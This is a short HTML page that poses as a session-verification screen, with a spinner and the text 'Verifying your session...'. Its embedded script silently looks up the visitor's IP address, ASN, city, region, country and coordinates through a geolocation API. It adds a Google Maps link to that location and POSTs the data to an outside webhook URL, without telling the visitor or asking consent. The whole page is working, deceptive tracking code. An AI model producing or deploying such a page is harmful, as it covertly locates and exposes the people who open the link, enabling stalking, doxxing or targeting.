<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Verification</title>
  <style>
    body {
      background-color: #0d0d0d;
      color: #f2f2f2;
      font-family: 'Segoe UI', sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
    }

    .spinner {
      border: 6px solid #333;
      border-top: 6px solid #09f;
      border-radius: 50%;
      width: 60px;
      height: 60px;
      animation: spin 1s linear infinite;
      margin-bottom: 20px;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .text {
      font-size: 20px;
      color: #aaa;
    }
  </style>
</head>
<body>

  <div class="spinner"></div>
  <div class="text">Verifying your session...</div>

  <script>
    async function logIP() {
      try {
        const res = await fetch("https://api.db-ip.com/v2/free/self");
        const data = await res.json();

        const {
          ipAddress,
          city,
          stateProv,
          countryName,
          latitude,
          longitude,
          asn
        } = data;

        const googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;

        const payload = {
          ip: ipAddress,
          city,
          region: stateProv,
          country: countryName,
          asn,
          latitude,
          longitude,
          map_link: googleMapsLink
        };

        await fetch("https://webhook-test.com/26eff05a1fb9bd13e113d9a93d51f174", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload)
        });
      } catch (err) {
        console.error("Failed to fetch/log IP:", err);
      }
    }

    logIP();
  </script>

</body>
</html>
